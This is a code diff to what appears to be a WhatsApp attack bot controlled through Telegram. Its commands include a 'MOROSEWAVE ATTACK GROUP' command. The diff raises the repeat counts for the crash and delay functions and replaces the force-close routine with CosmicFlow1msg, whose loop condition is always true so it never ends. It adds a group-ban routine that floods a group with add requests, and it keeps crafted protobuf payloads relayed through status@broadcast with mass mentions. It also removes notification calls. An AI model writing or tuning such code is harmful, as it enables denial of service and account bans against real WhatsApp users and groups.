@@ -2248,7 +2248,7 @@ function getMenuControls(warna) {
 function getMenuToolss(warna) {
     return [
         [
-            createButton("𝗕𝗔𝗖𝗞", "menu_controls", 'nav', warna),
+            createButton("𝗕𝗔𝗖𝗞", "menu_homecontrols", 'nav', warna),
             createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
             createButton("𝗡𝗘𝗫𝗧", "menu_homebugs", 'nav', warna)
         ],
@@ -3020,7 +3020,7 @@ Status: Process
   const processMessageId = processMessage.message_id;
 
   for (let i = 0; i < 1; i++) {
-    await ForcloseNewXka(sock, target);
+    await CosmicFlow1msg(sock, target);
   }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -3066,7 +3066,7 @@ Status: Process
 
   const processMessageId = processMessage.message_id;
 
-  for (let i = 0; i < 10; i++) {
+  for (let i = 0; i < 15; i++) {
     await maklu(sock, target);
     await sleep(500);
   }
@@ -3114,7 +3114,7 @@ Status: Process
 
   const processMessageId = processMessage.message_id;
 
-  for (let i = 0; i < 2; i++) {
+  for (let i = 0; i < 12; i++) {
     await DelayXFrezee(sock, target);
     await sleep(500);
   }
@@ -3162,7 +3162,7 @@ Status: Process
 
   const processMessageId = processMessage.message_id;
 
-  for (let i = 0; i < 10; i++) {
+  for (let i = 0; i < 12; i++) {
     await topsbuldog(sock, target);
     await sleep(500);
   }
@@ -3240,8 +3240,6 @@ bot.command("morogroupv1", checkWhatsAppConnection, checkCooldown, checkCommandE
     let inviteCode = input;
     const match = input.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
     if (match) inviteCode = match[1];
-
-    await sendBugNotification(ctx, '/morogroupv1', input);
 
     const msg = await ctx.reply(`<pre><code class="language-javascript">
 ✘ MOROSEWAVE ATTACK GROUP ✘
@@ -3347,8 +3345,6 @@ bot.command("morogroupv2", checkWhatsAppConnection, checkCooldown, checkCommandE
     let inviteCode = input;
     const match = input.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
     if (match) inviteCode = match[1];
-
-    await sendBugNotification(ctx, '/morogroupv2', input);
 
     const msg = await ctx.reply(`<pre><code class="language-javascript">
 ✘ MOROSEWAVE ATTACK GROUP ✘
@@ -5781,57 +5777,30 @@ async function Slayerspmvideo(sock, target) {
     }
 }
 //ban gb
-async function bannidoGroup(sock, groupJid) {
-    if (!groupJid.endsWith("@g.us")) {
-        throw new Error("@g.us server required");
+async function BanGroupNewV2(sock, groupJid) {
+  const startTime = Date.now();
+  const duration = 3 * 60 * 1000;
+  
+  while (Date.now() - startTime < duration) {
+    if (!groupJid.endsWith('@g.us')) {
+      throw new Error('@g.us server required');
     }
-    const LIDNUMBER = [
-        "6280000000000@s.whatsapp.net",
-        "14155552671@s.whatsapp.net",
-        "447400000000@s.whatsapp.net",
-        "61400000000@s.whatsapp.net",
-        "6281234567890@s.whatsapp.net",
-        "6287873499996@s.whatsapp.net",
-        "6285655555555@s.whatsapp.net",
-        "6289876543210@s.whatsapp.net",
-        "6281111111111@s.whatsapp.net",
-        "6282222222222@s.whatsapp.net",
-        "6283333333333@s.whatsapp.net",
-        "6284444444444@s.whatsapp.net",
-        "6285555555555@s.whatsapp.net",
-        "6286666666666@s.whatsapp.net",
-        "6287777777777@s.whatsapp.net",
-        "6288888888888@s.whatsapp.net",
-        "6289999999999@s.whatsapp.net",
-        "6281000000001@s.whatsapp.net",
-        "6281000000002@s.whatsapp.net",
-        "6281000000003@s.whatsapp.net",
-        "6281000000004@s.whatsapp.net",
-        "6281000000005@s.whatsapp.net",
-        "6282000000001@s.whatsapp.net",
-        "6282000000002@s.whatsapp.net",
-        "6282000000003@s.whatsapp.net",
-        "6282000000004@s.whatsapp.net",
-        "6282000000005@s.whatsapp.net",
-        "6283000000001@s.whatsapp.net",
-        "6283000000002@s.whatsapp.net",
-        "6283000000003@s.whatsapp.net",
-        "6283000000004@s.whatsapp.net",
-        "6283000000005@s.whatsapp.net"
-    ];
 
-    const actions = ["add"];
-    const fake = LIDNUMBER[Math.floor(Math.random() * LIDNUMBER.length)];
-    const action = actions[Math.floor(Math.random() * actions.length)];
+    let group = groupJid;
 
     try {
-        await sock.groupParticipantsUpdate(target, [fake], action);
-        await new Promise(r => setTimeout(r, 2500));
-        return true;
-    } catch (e) {
-        await new Promise(r => setTimeout(r, 1500));
-        return false;
+      await sock.groupParticipantsUpdate(
+        group,
+        ['18188880008@s.whatsapp.net'],
+        'add',
+      );
+
+      await sock.sendPresenceUpdate('composing', group);
+    } catch (err) {
+      console.error('error:', err);
+      throw err;
     }
+  }
 }
 //Fc group
 async function BlankMaklo(sock, groupJid) {
@@ -5849,39 +5818,40 @@ async function BlankMaklo(sock, groupJid) {
 
 //FUNCTION BEBAS SPAMM
 //fc 
-async function ForcloseNewXka(sock, target) {
+async function CosmicFlow1msg(sock, target) {
+while (Date.now() - Date.now() < 200000) {
 const IMG = {
-url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
-directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
-mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
-fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
-fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
-fileLength: 20010,
-mediaKeyTimestamp: "1785637793",
-mimetype: "image/jpeg",
-height: 1600,
-width: 1200,
-jpegThumbnail: ""
-};
+  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
+  directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
+   mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
+   fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
+   fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
+   fileLength: 20010,
+   mediaKeyTimestamp: "1785637793",
+   mimetype: "image/jpeg",
+   height: 1600,
+   width: 1200,
+   jpegThumbnail: ""
+ };
 
-const TAGS = [
-[0xBA, 0x03],
-[0xD2, 0x04],
-[0xAA, 0x02],
-];
+ const TAGS = [
+  [0xBA, 0x03],
+  [0xD2, 0x04],
+  [0xAA, 0x02],
+ ];
 
 const encodeVarint = function(n) {
-var buf = [];
-while (n >= 0x80) {
-buf.push((n & 0x7f) | 0x80);
-n >>>= 7;
-}
-buf.push(n);
-return Buffer.from(buf);
-};
+  var buf = [];
+  while (n >= 0x80) {
+   buf.push((n & 0x7f) | 0x80);
+   n >>>= 7;
+  }
+  buf.push(n);
+  return Buffer.from(buf);
+ };
 
 const wrapLd = function(tag, data) {
-return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
+ return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
 };
 
 const basePayload = proto.Message.encode(
@@ -5932,29 +5902,22 @@ if (!payload) continue;
 var msgId = 'moro' + Date.now().toString(36).toUpperCase() + '_' + i + '_' + offset;
 
 try {
-await depayy.relayMessage('status@broadcast', payload, {
-messageId: msgId,
-statusJidList: chunk,
-additionalNodes: [{
-tag: 'meta',
-attrs: {},
-content: [{
-tag: 'mentioned_users',
-attrs: {},
-content: chunk.map(function(jid) {
-return { tag: 'to', attrs: { jid: jid }, content: [] };
-})
-}]
-}]
-});
-totalSent++;
-console.log(`✅ Moro Model Brutal To ${target} (${totalSent} total)`);
-} catch (_) {}
-
-await new Promise(function(r) { setTimeout(r, 1000); });
-}
-}
-}
+await sock.relayMessage('status@broadcast', payload, {
+messageId: msgId, statusJidList: chunk, additionalNodes: [{
+  tag: 'meta', attrs: {}, content: [{
+    tag: 'mentioned_users', attrs: {}, content: chunk.map(function(target) {
+            return { tag: 'to', attrs: { jid: target }, content: [] };
+           })
+         }]
+       }]
+     });
+     totalSent++;
+     } catch (_) {}
+         await new Promise(function(r) { setTimeout(r, 1000); });
+        }
+      }
+    }
+  }
 }
 //delay 
 async function maklu(sock, target) {
